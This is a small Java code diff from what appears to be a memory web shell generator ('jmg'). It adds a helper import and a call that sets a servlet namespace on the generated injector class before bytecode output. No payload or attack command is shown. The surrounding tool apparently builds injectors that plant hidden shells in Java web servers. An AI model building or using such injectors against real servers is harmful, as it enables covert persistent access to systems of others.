@@ -7,6 +7,7 @@ import javassist.CtField;
 import org.leo.core.util.asm.ClassFileMinimizer;
 import org.leo.jmg.ShellGeneratorConfig;
 import org.leo.jmg.util.base64.Base64Utils;
+import org.leo.jmg.util.javassist.JavassistUtil;
 
 import java.io.InputStream;
 
@@ -47,7 +48,7 @@ public class InjectorGenerator {
         replaceStaticField(ctClass, "urlPattern",
                 "private static String urlPattern = \"" + escapeForJavaString(config.getUrlPattern()) + "\";");
 
-
+        JavassistUtil.applyServletNamespace(ctClass, config.getEffectiveServletNamespace());
 
         try {
             byte[] bytes = ctClass.toBytecode();
